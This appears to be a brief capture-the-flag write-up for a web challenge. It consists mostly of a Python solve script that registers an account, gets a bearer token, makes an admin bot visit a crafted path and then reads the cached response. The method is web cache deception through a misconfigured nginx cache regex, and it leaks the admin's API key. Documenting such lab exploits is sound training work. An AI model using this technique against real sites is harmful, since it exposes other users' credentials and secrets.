![[Screenshot 2025-11-30 201952.png]]
Solve script: 
```python
#!/bin/env python3
import requests
import re
url = "http://94.237.52.235:40262" # Replace with the online instance
proxies = {
    'http': '127.0.0.1:8080',
}
payload = {
    "username": "abc123",
    "password": "123",
}

respones = requests.post(url, json=payload)

if 'Credentials not found' in respones.json().get("message", ""):
    print("no account was found maybe you restarted the container?")
    print("making account with the following creds = abc123:123")
    requests.post(url + "/register", json={
        "username": "abc123",
        "password": "123",
        "email": "123", })
    respones = requests.post(url, json=payload)


user_token = respones.json()["token"]

print(user_token)

headers = {
    'Authorization': f'Bearer {user_token}',
    'Content-type': 'application/json'
}

my_profile = requests.get(url + "/profile", headers=headers)
print(my_profile.text)

subpath = 'profile.js'
if re.match(r'.*^profile', subpath):
    print(subpath)
else:
    print("not", subpath)

bot = requests.post(url + "/visit", headers=headers, json={"uri": "profile.js"})
print(bot.status_code, bot.text)

cached = requests.get(url + "/profile.js")

print(cached.text)
```
The key is to keep running the script even if it returns invalid token for the first 3-4 times.
With the cache poisoning the flag will be returned as the api key of admin with id one when we visit  the bot `/visit ` with the URI matching the misconfigured regex ( profile.png or any other combo that is valid seeing the conf of the nginx server acting as the cache proxy)